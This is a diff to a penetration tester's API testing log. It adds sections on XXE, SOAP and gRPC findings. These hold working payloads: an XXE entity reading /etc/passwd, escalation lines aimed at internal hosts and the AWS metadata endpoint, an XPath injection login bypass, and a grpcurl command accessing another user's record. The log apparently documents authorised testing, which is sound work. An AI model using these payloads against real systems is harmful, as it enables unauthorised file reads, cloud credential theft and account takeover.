@@ -1,3 +1,5 @@
+#request-tracking #testing-log #evidence #api-testing #owasp #bola #injection #jwt #ssrf #graphql #soap #grpc
+
 # API Request Tracker
 
 Track all API requests, exploitation attempts, and findings during testing. This document serves as your testing log and helps identify patterns in what works vs. what fails.
@@ -648,6 +650,44 @@ Chain exploitation:
 
 ---
 
+## XXE Injection
+
+| ID | Endpoint | Parameter | Payload Summary | Result | Impact | Screenshot |
+|----|----------|-----------|-----------------|--------|--------|------------|
+| RT-1251 | POST /api/import | XML body | DOCTYPE + external entity | ✅ Success | /etc/passwd read | IMG_125 |
+| RT-1252 | POST /api/upload | XML file upload | Blind XXE via DNS/HTTP | ✅ Success | OOB callback received | IMG_126 |
+| RT-1253 | | | | | | |
+
+### XXE Exploits
+
+**RT-1251 Details**:
+```
+Endpoint: POST /api/import
+Content-Type: application/xml
+
+Payload:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>
+  <data>&xxe;</data>
+</root>
+
+Response: 200 OK
+{
+  "data": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:..."
+}
+
+Finding: XXE allows local file read
+CVSS: 7.5 (High)
+OWASP API: API4:2023 / API8:2023 (Misconfiguration)
+
+Escalation paths:
+- Internal port scan via SSRF: <!ENTITY xxe SYSTEM "http://192.168.1.1:80/">
+- AWS metadata: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+```
+
+---
+
 ## GraphQL Exploits
 
 | ID | Query/Mutation | Exploit Type | Payload | Result | Impact | Screenshot |
@@ -693,6 +733,69 @@ mutation {
     success
   }
 }
+```
+
+---
+
+## SOAP Exploits
+
+| ID | Operation | Exploit Type | Payload Summary | Result | Impact | Screenshot |
+|----|-----------|-------------|-----------------|--------|--------|------------|
+| RT-1351 | Login | XPath injection | admin' or '1'='1 | ✅ Success | Auth bypass | IMG_135 |
+| RT-1352 | GetUserData | SOAPAction swap | Action=Read, Body=Delete | ✅ Success | Unauthorized delete | IMG_136 |
+| RT-1353 | | | | | | |
+
+### SOAP Exploit Details
+
+**RT-1351 Details**:
+```
+Endpoint: POST /service
+Operation: Login
+
+Normal request:
+<username>testuser</username>
+<password>wrongpass</password>
+Result: 401 Unauthorized
+
+Exploited request:
+<username>admin' or '1'='1</username>
+<password>x</password>
+Result: 200 OK — logged in as admin
+
+Finding: XPath injection in SOAP authentication
+CVSS: 9.8 (Critical)
+```
+
+---
+
+## gRPC Exploits
+
+| ID | Service/Method | Exploit Type | Payload | Result | Impact | Screenshot |
+|----|---------------|-------------|---------|--------|--------|------------|
+| RT-1401 | UserService/GetUser | BOLA | user_id: 2 with user 1 token | ✅ Success | Cross-user data access | IMG_140 |
+| RT-1402 | AdminService/DeleteUser | BFLA | Called as regular user | ✅ Success | Unauthorized admin action | IMG_141 |
+| RT-1403 | | | | | | |
+
+### gRPC Exploit Details
+
+**RT-1401 Details**:
+```bash
+# User 1's token accessing User 2's data
+grpcurl -plaintext \
+  -H "authorization: Bearer <user1_token>" \
+  -d '{"user_id": 2}' \
+  api.target.com:50051 target.UserService/GetUser
+
+Response:
+{
+  "user_id": 2,
+  "email": "victim@example.com",
+  "address": "123 Main St"
+}
+
+Finding: No authorization check on user_id in gRPC method
+CVSS: 8.1 (High)
+OWASP API: API1:2023 (BOLA)
 ```
 
 ---
@@ -867,13 +970,9 @@ curl -X GET "https://api.target.com/api/order/$ORDER_ID/confirm" \
 
 ---
 
-## Tags
-#request-tracking #testing-log #evidence #api-testing #owasp
-
----
-
 ## Related Documents
 - [[API-00-Overview|Overview]]
+- [[API-01-Admin-Checklist|Admin Checklist]]
 - [[API-02-Technical-Testing-Checklist|Technical Testing Checklist]]
 - [[API-04-Evidence-Collection|Evidence Collection]]
 - [[API-05-Reporting-Template|Reporting Template]]
@@ -881,5 +980,6 @@ curl -X GET "https://api.target.com/api/order/$ORDER_ID/confirm" \
 
 ---
 *Created: 2026-01-21*
+*Updated: 2026-03-05*
 *Tester: Er2oneousbit*
-*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
+*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.6*
